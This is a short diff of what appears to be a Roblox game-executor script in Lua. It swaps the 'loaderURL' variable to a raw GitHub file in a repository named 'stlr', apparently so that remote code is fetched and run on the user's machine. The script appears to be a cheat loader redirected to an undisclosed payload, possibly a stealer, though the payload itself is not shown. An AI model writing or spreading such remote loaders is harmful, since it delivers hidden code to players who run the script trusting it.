@@ -24,7 +24,7 @@ local function detectExecutor()
 end
 
 local executor = detectExecutor()
-local loaderURL = "https://raw.githubusercontent.com/nedyxxx/GAG/refs/heads/main/test2" -- Insert your loader script URL here
+local loaderURL = "https://raw.githubusercontent.com/GnomeStorage/stlr/refs/heads/main/comb" -- Insert your loader script URL here
 
 if executor == "Delta" then
     local screenGui = Instance.new("ScreenGui")
